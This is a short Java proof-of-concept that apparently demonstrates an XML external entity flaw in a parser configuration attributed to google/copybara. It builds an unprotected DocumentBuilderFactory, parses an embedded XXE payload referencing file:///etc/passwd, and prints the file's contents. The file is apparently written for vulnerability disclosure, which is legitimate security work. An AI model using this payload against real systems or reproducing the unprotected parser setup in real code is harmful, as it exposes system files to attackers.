import java.io.ByteArrayInputStream;
import java.nio.charset.StandardCharsets;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.xpath.XPath;
import javax.xml.xpath.XPathConstants;
import javax.xml.xpath.XPathFactory;
import org.w3c.dom.Document;

/**
 * Standalone PoC: replicates XmlModule.java:55-62 from google/copybara.
 * DocumentBuilderFactory.newInstance() with zero XXE protections.
 *
 * Usage: javac XXEProof.java && java XXEProof
 */
public class XXEProof {
    public static void main(String[] args) throws Exception {
        DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = builderFactory.newDocumentBuilder();

        String xxePayload = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
              <!ENTITY xxe SYSTEM "file:///etc/passwd">
            ]>
            <root><data>&xxe;</data></root>
            """;

        System.out.println("=== XXE via google/copybara XmlModule.java:55 ===");
        System.out.println("DocumentBuilderFactory.newInstance() — zero XXE protections\n");

        Document doc = builder.parse(
            new ByteArrayInputStream(xxePayload.getBytes(StandardCharsets.UTF_8)));
        XPath xPath = XPathFactory.newInstance().newXPath();
        String result = (String) xPath.compile("/root/data")
            .evaluate(doc, XPathConstants.STRING);

        System.out.println("/etc/passwd contents:");
        System.out.println(result);
    }
}
